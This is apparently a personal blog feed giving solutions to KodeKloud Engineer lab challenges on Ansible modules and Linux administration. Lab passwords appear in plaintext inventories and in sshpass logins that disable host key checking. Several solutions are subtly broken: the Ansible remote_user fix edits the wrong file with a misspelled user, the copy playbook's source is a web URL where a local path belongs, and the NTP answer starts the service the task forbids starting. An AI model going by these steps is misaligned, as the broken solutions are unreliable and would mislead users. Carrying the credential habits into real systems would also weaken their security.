<li>On jump host make appropriate changes so that Ansible can use kirsty as a default ssh user for all hosts. Make changes in Ansible&rsquo;s default configuration only —please do not try to create a new config.</li>
</ul>
<h6 id="solution-5">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>thor@jump_host ~$ ansible --version
</span></span><span style="display:flex;"><span>ansible 2.9.9
</span></span><span style="display:flex;"><span>  config file <span style="color:#f92672">=</span> /etc/ansible/ansible.cfg
</span></span><span style="display:flex;"><span>thor@jump_host ~$ sudo vi /etc/ansible.cfg
</span></span><span style="display:flex;"><span>&gt; search <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;#remote_user=root&#34;</span> and change it to <span style="color:#e6db74">&#34;remote_user=kirst&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>ansible-config dump | grep USER 
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="ansible-copy-module">Ansible Copy Module</h2>
<ul>
<li>There is data on jump host that needs to be copied on all application servers in Stratos DC. Nautilus DevOps team want to perform this task using Ansible. Perform the task as per details mentioned below:</li>
<li>a. On jump host create an inventory file /home/thor/ansible/inventory and add all application servers as managed nodes.</li>
<li>b. On jump host create a playbook /home/thor/ansible/playbook.yml to copy /usr/src/finance/index.html file to all application servers at location /opt/finance.</li>
<li>Note: Validation will try to run the playbook using command ansible-playbook -i inventory playbook.yml so please make sure the playbook works this way without passing any extra arguments.</li>
</ul>
<h6 id="solution-6">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>ansible --version
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;stapp01 ansible_user=tony ansible_password=Ir0nM@n&#34;</span> &gt; ansible/inventory
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;stapp02 ansible_user=steve ansible_password=Am3ric@&#34;</span> &gt;&gt; ansible/inventory
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;stapp03 ansible_user=banner ansible_password=BigGr33n&#34;</span> &gt;&gt; ansible/inventory
</span></span><span style="display:flex;"><span>ansible all -i ansible/inventory  -m ping
</span></span><span style="display:flex;"><span>vi ansible/playbook.yml
</span></span><span style="display:flex;"><span>ansible-playbook -i ansible/inventory -C ansible/playbook.yml
</span></span><span style="display:flex;"><span>ansible-playbook -i ansible/inventory ansible/playbook.yml
</span></span><span style="display:flex;"><span>ansible all -i ansible/inventory -a <span style="color:#e6db74">&#34;cat /opt/finance/index.html&#34;</span>
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">all</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">gather_facts</span>: <span style="color:#66d9ef">no</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">become</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">tasks</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">copy</span>: <span style="color:#ae81ff">src=https://chxmxii.github.io/portfolio/usr/src/finance/index.html dest=/opt/finance/</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="ansible-file-module">Ansible File Module</h2>
<ul>
<li>The Nautilus DevOps team is working to test several Ansible modules on servers in Stratos DC. Recently they wanted to test the file creation on remote hosts using Ansible. Find below more details about the task:</li>
<li>a. Create an inventory file ~/playbook/inventory on jump host and add all app servers in it.</li>
<li>b. Create a playbook ~/playbook/playbook.yml to create a blank file /tmp/data.txt on all app servers.</li>
<li>c. The /tmp/data.txt file permission must be 0755.</li>
<li>d. The user/group owner of file /tmp/data.txt must be tony on app server 1, steve on app server 2 and banner on app server 3.</li>
<li>Note: Validation will try to run the playbook using command ansible-playbook -i inventory playbook.yml, so please make sure the playbook works this way without passing any extra arguments.</li>
</ul>
<h6 id="solution-7">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cd playbook
</span></span><span style="display:flex;"><span>ansible --version
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;stapp01 ansible_user=tony ansible_password=Ir0nM@n&#34;</span> &gt; inventory
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;stapp02 ansible_user=steve ansible_password=Am3ric@&#34;</span> &gt;&gt; inventory
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;stapp03 ansible_user=banner ansible_password=BigGr33n&#34;</span> &gt;&gt; inventory
</span></span><span style="display:flex;"><span>ansible all -i inventory  -m ping
</span></span><span style="display:flex;"><span>vi playbook.yml
</span></span><span style="display:flex;"><span>ansible-playbook -i inventory playbook.yml
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>ansible all -i inventory  -a <span style="color:#e6db74">&#34;ls -l /tmp/data.txt&#34;</span>
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">all</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">tasks</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">file</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/tmp/data.txt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">state</span>: <span style="color:#ae81ff">touch</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">owner</span>: <span style="color:#ae81ff">tony</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">group</span>: <span style="color:#ae81ff">tony</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">mode</span>: <span style="color:#e6db74">&#39;0755&#39;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">when</span>: <span style="color:#ae81ff">ansible_hostname == &#34;stapp01&#34;</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">file</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/tmp/data.txt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">state</span>: <span style="color:#ae81ff">touch</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">owner</span>: <span style="color:#ae81ff">steve</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">group</span>: <span style="color:#ae81ff">steve</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">mode</span>: <span style="color:#e6db74">&#39;0755&#39;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">when</span>: <span style="color:#ae81ff">ansible_hostname == &#34;stapp02&#34;</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">file</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/tmp/data.txt</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">state</span>: <span style="color:#ae81ff">touch</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">owner</span>: <span style="color:#ae81ff">banner</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">group</span>: <span style="color:#ae81ff">banner</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">mode</span>: <span style="color:#e6db74">&#39;0755&#39;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">when</span>: <span style="color:#ae81ff">ansible_hostname == &#34;stapp03&#34;</span>
</span></span></code></pre></div></li>
</ul>
]]></content></item><item><title>KodeKloud Engineer System Administration Challenges - P1</title><link>https://chxmxii.github.io/portfolio/posts/2023/05/kodekloud-engineer-system-administration-challenges-p1/</link><pubDate>Fri, 26 May 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/05/kodekloud-engineer-system-administration-challenges-p1/</guid><description>Linux TimeZones Setting During the daily standup, it was pointed out that the timezone across Nautilus Application Servers in Stratos Datacenter doesn&amp;rsquo;t match with that of the local datacenter&amp;rsquo;s timezone, which is America/Blanc-Sablon. solution : #ssh to app server 1 account and switch to root sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking=no tony@stapp01 sudo su - # change the timezone to America/Blanc-Sablon timedatectl set-timezone America/Blanc-Sablon #Verify timedatectl Linux User Files There was some users data copied on Nautilus App Server 1 at /home/usersdata location by the Nautilus production support team in Stratos DC.</description><content type="html"><![CDATA[<hr>
<h2 id="linux-timezones-setting">Linux TimeZones Setting</h2>
<ul>
<li>During the daily standup, it was pointed out that the timezone across Nautilus Application Servers in Stratos Datacenter doesn&rsquo;t match with that of the local datacenter&rsquo;s timezone, which is America/Blanc-Sablon.</li>
</ul>
<h6 id="solution-">solution :</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server 1 account and switch to root</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e"># change the timezone to America/Blanc-Sablon</span>
</span></span><span style="display:flex;"><span>timedatectl set-timezone America/Blanc-Sablon
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Verify</span>
</span></span><span style="display:flex;"><span>timedatectl
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-user-files">Linux User Files</h2>
<ul>
<li>There was some users data copied on Nautilus App Server 1 at /home/usersdata location by the Nautilus production support team in Stratos DC. Later they found that they mistakenly mixed up different user data there. Now they want to filter out some user data and copy it to another location. Find the details below:</li>
<li>On App Server 1 find all files (not directories) owned by user javed inside /home/usersdata directory and copy them all while keeping the folder structure (preserve the directories path) to /news directory.</li>
</ul>
<h6 id="solution--1">Solution :</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to user tony on App server 1 </span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#find all the files copy the to /news directory while keeping the folder structure.</span>
</span></span><span style="display:flex;"><span>find /home/usersdata/ -type f -user javed -exec cp --parents <span style="color:#f92672">{}</span> /news/ <span style="color:#ae81ff">\;</span> 2&gt;/dev/null
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>yum install tree -y
</span></span><span style="display:flex;"><span>tree /news
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-user-without-home">Linux User Without Home</h2>
<ul>
<li>The system admins team of xFusionCorp Industries has set up a new tool on all app servers, as they have a requirement to create a service user account that will be used by that tool. They are finished with all apps except for App Server 1 in Stratos Datacenter.</li>
<li>Create a user named ravi in App Server 1 without a home directory.</li>
</ul>
<h6 id="solution">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Login to tony account in App server 1 via SSH</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#man useradd and look for the option to create a user without a home dir</span>
</span></span><span style="display:flex;"><span>sudo useradd -M ravi
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>getent passwd
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="mariadb-troubleshooting">MariaDB Troubleshooting</h2>
<ul>
<li>There is a critical issue going on with the Nautilus application in Stratos DC. The production support team identified that the application is unable to connect to the database. After digging into the issue, the team found that mariadb service is down on the database server.</li>
<li>Look into the issue and fix the same.</li>
</ul>
<h6 id="soltuion">Soltuion:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Connect to the db instance</span>
</span></span><span style="display:flex;"><span>sshpass -p Sp<span style="color:#ae81ff">\!</span>dy ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no peter@stdb01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Verify the status of mariadb service</span>
</span></span><span style="display:flex;"><span>systemctl status mariadb
</span></span><span style="display:flex;"><span><span style="color:#75715e">#go through the logs and pay some attention!</span>
</span></span><span style="display:flex;"><span>journalctl -xe
</span></span><span style="display:flex;"><span>cat /var/log/mariadb/mariadb.log
</span></span><span style="display:flex;"><span><span style="color:#75715e">#as you can see, the mariadb service coudln\&#39;t start due to &#39;permision denied&#39; problem! </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#lets check the ownerships of both folders /var/lib/mysql and /var/run/mariadb</span>
</span></span><span style="display:flex;"><span>ll /var/lib/mysql
</span></span><span style="display:flex;"><span>ll /var/run/mariadb
</span></span><span style="display:flex;"><span><span style="color:#75715e">#we notice that the owner of mariadb is sat to root and this was the root problem</span>
</span></span><span style="display:flex;"><span>cd /var/run/
</span></span><span style="display:flex;"><span>chown -R mysql:mysql mariadb/
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start and enbale the service</span>
</span></span><span style="display:flex;"><span>systemctl start mariadb
</span></span><span style="display:flex;"><span>systemctl enable --now mariadb
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-ssh-authentication">Linux SSH Authentication</h2>
<ul>
<li>The system admins team of xFusionCorp Industries has set up some scripts on jump host that run on regular intervals and perform operations on all app servers in Stratos Datacenter. To make these scripts work properly we need to make sure the thor user on jump host has password-less SSH access to all app servers through their respective sudo users (i.e tony for app server 1). Based on the requirements, perform the following:</li>
<li>Set up a password-less authentication from user thor on jump host to all app servers through their respective sudo users.</li>
</ul>
<h6 id="solution-1">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#generate ssh key</span>
</span></span><span style="display:flex;"><span>ssh-keygen -t rsa 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#copy the generated key</span>
</span></span><span style="display:flex;"><span>ssh-copy-id tony@stapp01
</span></span><span style="display:flex;"><span>ssh-copy-id steve@stapp02
</span></span><span style="display:flex;"><span>ssh-copy-id banner@stapp03
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>ssh tony@stapp01
</span></span><span style="display:flex;"><span>ssh steve@stapp02
</span></span><span style="display:flex;"><span>ssh banner@stapp03
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-collaborative-directories">Linux Collaborative Directories</h2>
<ul>
<li>The Nautilus team doesn&rsquo;t want its data to be accessed by any of the other groups/teams due to security reasons and want their data to be strictly accessed by the devops group of the team.</li>
<li>Setup a collaborative directory /devops/data on Nautilus App 3 server in Stratos Datacenter.</li>
<li>The directory should be group owned by the group devops and the group should own the files inside the directory. The directory should be read/write/execute to the group owners, and others should not have any access.</li>
</ul>
<h6 id="solution-2">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server3</span>
</span></span><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#create dir /devops/data</span>
</span></span><span style="display:flex;"><span>mkdir -p /devops/data
</span></span><span style="display:flex;"><span><span style="color:#75715e">#change the group owner</span>
</span></span><span style="display:flex;"><span>m1 : chgrp -R devops /devops <span style="color:#f92672">&amp;&amp;</span> chgrp -R devops /devops/data <span style="color:#f92672">(</span>-R &gt; <span style="color:#66d9ef">for</span> recursive<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>m2 : chown -R :devops /devops 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#change the dir perms</span>
</span></span><span style="display:flex;"><span>chmod -R <span style="color:#ae81ff">2770</span> /devops/ <span style="color:#f92672">&amp;&amp;</span> chmod -R <span style="color:#ae81ff">2770</span> /devops/data
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> &gt; SGID
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span> &gt; rwx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> &gt; ---
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-ntp-setup">Linux NTP Setup</h2>
<ul>
<li>The system admin team of xFusionCorp Industries has noticed an issue with some servers in Stratos Datacenter where some of the servers are not in sync w.r.t time. Because of this, several application functionalities have been impacted. To fix this issue the team has started using common/standard NTP servers. They are finished with most of the servers except App Server 1. Therefore, perform the following tasks on this server:</li>
<li>Install and configure NTP server on App Server 1.</li>
<li>Add NTP server 1.south-america.pool.ntp.org in NTP configuration on App Server 1.</li>
<li>Please do not try to start/restart/stop ntp service, as we already have a restart for this service scheduled for tonight and we don&rsquo;t want these changes to be applied right now</li>
</ul>
<h6 id="solution-3">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server 1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostkeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Install ntp server if not installed</span>
</span></span><span style="display:flex;"><span>rpm -qa | grep ntp
</span></span><span style="display:flex;"><span>yum install -y ntp
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Configure NTP server</span>
</span></span><span style="display:flex;"><span>vi /etc/ntp.conf 
</span></span><span style="display:flex;"><span>~ insert this line <span style="color:#f92672">(</span>NTP server 1.south-america.pool.ntp.org<span style="color:#f92672">)</span> <span style="color:#66d9ef">then</span> save and quit
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Start and enable the ntp daemon</span>
</span></span><span style="display:flex;"><span>systemctl enable ntpd
</span></span><span style="display:flex;"><span>systemctl start ntpd
</span></span><span style="display:flex;"><span>systemctl status ntpd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify configuration</span>
</span></span><span style="display:flex;"><span>ntpstat
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-run-levels">Linux Run Levels</h2>
<ul>
<li>New tools have been installed on the app server in Stratos Datacenter. Some of these tools can only be managed from the graphical user interface. Therefore, there are requirements for these app servers.</li>
<li>On all App servers in Stratos Datacenter change the default runlevel so that they can boot in GUI (graphical user interface) by default. Please do not try to reboot these servers</li>
</ul>
<h6 id="solution-4">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app server of the 3 accounts</span>
</span></span><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch user to root</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#get the default target</span>
</span></span><span style="display:flex;"><span>systemctl get-default
</span></span><span style="display:flex;"><span><span style="color:#75715e">#notice the default target is set to multi-user.target, you can list all the target using the following command</span>
</span></span><span style="display:flex;"><span>systemctl list-units
</span></span><span style="display:flex;"><span><span style="color:#75715e">#set the default target to graphical.target</span>
</span></span><span style="display:flex;"><span>systemctl set-default graphical.target
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start the new target and verify</span>
</span></span><span style="display:flex;"><span>systemctl start graphical.target <span style="color:#f92672">&amp;&amp;</span> systemctl status graphical.target
</span></span><span style="display:flex;"><span>systemctl get-default
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-string-substitute">Linux String Substitute</h2>
<ul>
<li>The backup server in the Stratos DC contains several template XML files used by the Nautilus application. However, these template XML files must be populated with valid data before they can be used. One of the daily tasks of a system admin working in the xFusionCorp industries is to apply string and file manipulation commands!</li>
<li>Replace all occurances of the string Sample to Software on the XML file /root/nautilus.xml located in the backup server.</li>
</ul>
<h6 id="solution-5">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the backup server</span>
</span></span><span style="display:flex;"><span>sshpass -p H@wk3y3 ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no clint@stbkp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#change the word Sample with SoftWare in the XML file nautilus.xml</span>
</span></span><span style="display:flex;"><span>cat /root/nautilus.xml
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Using sed, you can always refer to the manual for help</span>
</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;s/Sample/Software/g&#39;</span> nautilus.xml
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Breaking down the sed command</span>
</span></span><span style="display:flex;"><span>-i &gt; save the changes to the file --in-place
</span></span><span style="display:flex;"><span>s &gt; substitue
</span></span><span style="display:flex;"><span>g &gt; global
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Using awk, refer to the manual for help</span>
</span></span><span style="display:flex;"><span>awk <span style="color:#e6db74">&#39;{gsub(&#34;Sample&#34;, &#34;Software&#34;, $0); print &gt; &#34;nautilus.xml&#34;}&#39;</span> nautilus.xml
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Breaking down the awk command</span>
</span></span><span style="display:flex;"><span>gsub<span style="color:#f92672">()</span> -&gt; awk <span style="color:#66d9ef">function</span> to globally substitue the Sample word with Software
</span></span><span style="display:flex;"><span>$0 -&gt; refers to the entire input line being proccessed <span style="color:#f92672">(</span>awk reads the input file line by line <span style="color:#66d9ef">until</span> it reaches the end of file<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>print &gt; <span style="color:#e6db74">&#34;nautilus.xml&#34;</span> -&gt; overwrites the original file with the modified lines
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-string-substitute-sed">Linux String Substitute (sed)</h2>
<ul>
<li>There is some data on Nautilus App Server 1 in Stratos DC. Data needs to be altered in several of the files. On Nautilus App Server 1, alter the /home/BSD.txt file as per details given below:</li>
<li>a. Delete all lines containing word following and save results in /home/BSD_DELETE.txt file. (Please be aware of case sensitivity)</li>
<li>b. Replace all occurrence of word and to them and save results in /home/BSD_REPLACE.txt file.</li>
<li>Note: Let&rsquo;s say you are asked to replace word to with from. In that case, make sure not to alter any words containing this string; for example upto, contributor etc.</li>
</ul>
<h6 id="solution-6">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server 1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to roo user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#cd the /home dir and cat the BSD.txt</span>
</span></span><span style="display:flex;"><span>cd /home 
</span></span><span style="display:flex;"><span>cat BSD.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Delete all lines containing word following and save results in /home/BSD_DELETE.txt file.</span>
</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;/\&lt;following\&gt;/d&#39;</span> /home/BSD.txt &gt; /home/BSD_DELETE.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Here, \&lt; and \&gt; are word boundaries in regular expressions, ensuring that only the exact word &#34;following&#34; is </span>
</span></span><span style="display:flex;"><span>matched and not parts of other words.
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Cat the original file and the modified one to verify</span>
</span></span><span style="display:flex;"><span>cat BSD.txt | grep following 
</span></span><span style="display:flex;"><span>cat BSD_DELETE.txt | grep follwing
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Replace all occurrence of word and to them and save results in /home/BSD_REPLACE.txt file.</span>
</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/\band\b/them/g&#39;</span> /home/BSD.txt &gt; /home/BSD_REPLACE.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Here, \b represents word boundaries in regular expressions, ensuring that only the word &#34;and&#34; is matched as a standalone word and not parts of other   </span>
</span></span><span style="display:flex;"><span>words. 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Cat the modified file to verify</span>
</span></span><span style="display:flex;"><span>cat BSD_REPLACE.txt | grep them
</span></span><span style="display:flex;"><span>cat BSD_REPLACE.txt | grep them
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="dns-troubleshooting">DNS TroubleShooting</h2>
<ul>
<li>the system admins team of xFusionCorp Industries has noticed intermittent issues with DNS resolution in several apps . App Server 3 in Stratos Datacenter is having some DNS resolution issues, so we want to add some additional DNS nameservers on this server.</li>
<li>As a temporary fix we have decided to go with Google public DNS (ipv4). Please make appropriate changes on this server.
ee</li>
</ul>
<h6 id="solution-7">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#Connect to the app server 3</span>
</span></span><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#test dns with ping command</span>
</span></span><span style="display:flex;"><span>ping www.google.com
</span></span><span style="display:flex;"><span>ping 8.8.8.8
</span></span><span style="display:flex;"><span><span style="color:#75715e">#modify resolv.conf file</span>
</span></span><span style="display:flex;"><span>vi /etc/resolv.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#add the following lines</span>
</span></span><span style="display:flex;"><span>nameserver 8.8.8.8
</span></span><span style="display:flex;"><span>nameserver 8.8.4.4
</span></span><span style="display:flex;"><span><span style="color:#75715e">#save modification and test</span>
</span></span><span style="display:flex;"><span>ping www.google.com
</span></span><span style="display:flex;"><span>ping 8.8.8.8
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="selinux-installation">Selinux Installation</h2>
<ul>
<li>The xFusionCorp Industries security team recently did a security audit of their infrastructure and came up with ideas to improve the application and server security. They decided to use SElinux for an additional security layer. They are still planning how they will implement it; however, they have decided to start testing with app servers, so based on the recommendations they have the following requirements:</li>
<li>Install the required packages of SElinux on App server 1 in Stratos Datacenter and disable it permanently for now; it will be enabled after making some required configuration changes on this host. Don&rsquo;t worry about rebooting the server as there is already a reboot scheduled for tonight&rsquo;s maintenance window. Also ignore the status of SElinux command line right now; the final status after reboot should be disabled.</li>
</ul>
<h6 id="solution-8">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
